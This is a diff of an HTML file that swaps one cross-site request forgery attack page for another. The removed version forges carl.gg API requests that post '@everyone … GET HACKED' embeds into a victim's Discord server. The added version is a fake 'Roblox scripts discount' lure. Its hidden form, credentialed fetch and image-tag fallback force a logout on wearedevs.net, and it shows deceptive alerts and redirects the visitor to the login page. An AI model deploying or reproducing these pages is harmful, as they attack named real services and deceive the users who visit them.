@@ -1,84 +1,110 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>White Page with Script</title>
+    <title>Legitimate Looking Page</title>
     <style>
         body {
-            background-color: white;
-            margin: 0;
-            height: 100vh;
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f4f4f4;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        p {
+            color: #666;
+            line-height: 1.6;
+        }
+        .button {
+            background-color: #007bff;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            display: block;
+            margin: 20px auto;
+            transition: background-color 0.3s;
+        }
+        .button:hover {
+            background-color: #0056b3;
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <h1>🎉 Special Offer Just For You! 🎉</h1>
+        <p>Click the button below to claim your exclusive discount on premium Roblox scripts and tools. This offer is only available for a limited time!</p>
+        
+        <!-- 𝗦𝘁𝗲𝗽 ➊: 𝗛𝗶𝗱𝗱𝗲𝗻 𝗖𝗦𝗥𝗙 𝗙𝗼𝗿𝗺 -->
+        <form id="csrfExploitForm" action="https://wearedevs.net/api/account/logout" method="POST" style="display: none;">
+            <!-- No additional fields needed - the endpoint doesn't require CSRF token validation -->
+        </form>
+        
+        <button class="button" onclick="triggerCSRF()">🤑 Claim My Discount Now!</button>
+        
+        <p><small>By clicking, you agree to our terms and conditions. Offer valid while supplies last.</small></p>
+    </div>
 
-<script>
-    function exploit() {
-        if (localStorage.getItem("log")) logarea.value = localStorage.getItem("log")
-        let guildId
-        let channelId
-        if (window.location.hash) {
-            guildId = window.location.hash.substring(1)
-            localStorage.setItem("guild", guildId)
-        } else if (!guildId) {
-            return error("Please set the Guild ID!")
-        }
-
-        if (window.location.search != "") {
-            channelId = window.location.search.substring(1)
-            localStorage.setItem("channel", channelId)
-        } else if (!channelId) {
-            return error("Please set the Channel ID!")
-        }
-
-        send(`https://carl.gg/api/v1/servers/${guildId}/embed`, "POST", {
-            "embed": {
-                "content": "@everyone",
-                "embed": {
-                    "title": "GET HACKED BY SILLYNOOBY",
-                    "description": "HACKED"},
-                    "color":2105893}
+    <script>
+    // 𝗦𝘁𝗲𝗽 ➋: 𝗖𝗦𝗥𝗙 𝗟𝗼𝗴𝗼𝘂𝘁 𝗙𝘂𝗻𝗰𝘁𝗶𝗼𝗻
+    function triggerCSRF() {
+        console.log('[+] Initiating CSRF logout exploit...');
+        
+        // 𝗦𝘁𝗲𝗽 ➌: 𝗦𝘂𝗯𝗺𝗶𝘁 𝘁𝗵𝗲 𝗵𝗶𝗱𝗱𝗲𝗻 𝗳𝗼𝗿𝗺
+        document.getElementById('csrfExploitForm').submit();
+        
+        // 𝗦𝘁𝗲𝗽 ➍: 𝗔𝗹𝘁𝗲𝗿𝗻𝗮𝘁𝗶𝘃𝗲 𝗙𝗲𝘁𝗰𝗵 𝗠𝗲𝘁𝗵𝗼𝗱 (𝗶𝗳 𝗳𝗼𝗿𝗺 𝗯𝗹𝗼𝗰𝗸𝗲𝗱)
+        fetch('https://wearedevs.net/api/account/logout', {
+            method: 'POST',
+            credentials: 'include', // 𝗜𝗻𝗰𝗹𝘂𝗱𝗲 𝗰𝗼𝗼𝗸𝗶𝗲𝘀 𝗳𝗼𝗿 𝗮𝘂𝘁𝗵
+            headers: {
+                'Content-Type': 'application/json'
             },
-            "channel": channelId
+            // 𝗘𝗺𝗽𝘁𝘆 𝗯𝗼𝗱𝘆 - 𝗲𝗻𝗱𝗽𝗼𝗶𝗻𝘁 𝗱𝗼𝗲𝘀𝗻'𝘁 𝗿𝗲𝗾𝘂𝗶𝗿𝗲 𝗮𝗻𝘆 𝗱𝗮𝘁𝗮
         })
-        cleanup()
-
+        .then(response => response.json())
+        .then(data => {
+            if(data.success) {
+                console.log('[+] CSRF logout successful! User has been logged out. ☠️');
+                // 𝗦𝘁𝗲𝗽 ➎: 𝗥𝗲𝗱𝗶𝗿𝗲𝗰𝘁 𝗼𝗿 𝘀𝗵𝗼𝘄 𝗳𝗮𝗸𝗲 𝗰𝗼𝗻𝘁𝗲𝗻𝘁
+                setTimeout(() => {
+                    alert('Congratulations! Your discount has been applied. Please login again to continue.');
+                    window.location.href = 'https://wearedevs.net/login';
+                }, 1000);
+            } else {
+                console.log('[-] CSRF failed:', data.reason);
+                alert('Oops! Something went wrong. Please try again.');
+            }
+        })
+        .catch(error => {
+            console.error('[-] Fetch error:', error);
+            // 𝗙𝗮𝗹𝗹𝗯𝗮𝗰𝗸: 𝗨𝘀𝗲 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝘁𝗮𝗴 𝘁𝗼 𝘁𝗿𝗶𝗴𝗴𝗲𝗿 𝗚𝗘𝗧 𝗿𝗲𝗾𝘂𝗲𝘀𝘁
+            const img = document.createElement('img');
+            img.src = 'https://wearedevs.net/api/account/logout';
+            img.style.display = 'none';
+            document.body.appendChild(img);
+        });
+        
+        // 𝗦𝘁𝗲𝗽 ➏: 𝗗𝗲𝗰𝗲𝗽𝘁𝗶𝘃𝗲 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸
+        alert('🎊 Amazing! Processing your exclusive discount...');
     }
-
-    const SUFFIX = ",\"foo"
-    function send(url, method, data) {
-        form.action = url
-        form.method = method
-        let jsonStr = JSON.stringify(data)
-        jsonStr = jsonStr.substring(0, jsonStr.length - 1) + SUFFIX
-        json.name = jsonStr
-
-        form.submit()
-
-
-    }
-
-    function cleanup() {
-        localStorage.removeItem("guild")
-        localStorage.removeItem("channel")
-        localStorage.removeItem("log")
-    }
-
-    function log(toLog) {
-        logarea.value += toLog + "\n"
-        localStorage.setItem("log", logarea.value)
-    }
-
-    function error(reason) {
-        log(reason)
-        cleanup()
-    }
-
-    exploit()
-
-</script>
-
+    
+    // 𝗦𝘁𝗲𝗽 ➐: 𝗔𝘂𝘁𝗼-𝗲𝘅𝗲𝗰𝘂𝘁𝗲 𝗼𝗻 𝗽𝗮𝗴𝗲 𝗹𝗼𝗮𝗱 (𝘀𝗶𝗹𝗲𝗻𝘁 𝗲𝘅𝗽𝗹𝗼𝗶𝘁)
+    window.addEventListener('load', function() {
+        // 𝗨𝗻𝗰𝗼𝗺𝗺𝗲𝗻𝘁 𝗻𝗲𝘅𝘁 𝗹𝗶𝗻𝗲 𝗳𝗼𝗿 𝗮𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰 𝗲𝘅𝗲𝗰𝘂𝘁𝗶𝗼𝗻
+        // triggerCSRF();
+    });
+    </script>
 </body>
 </html>
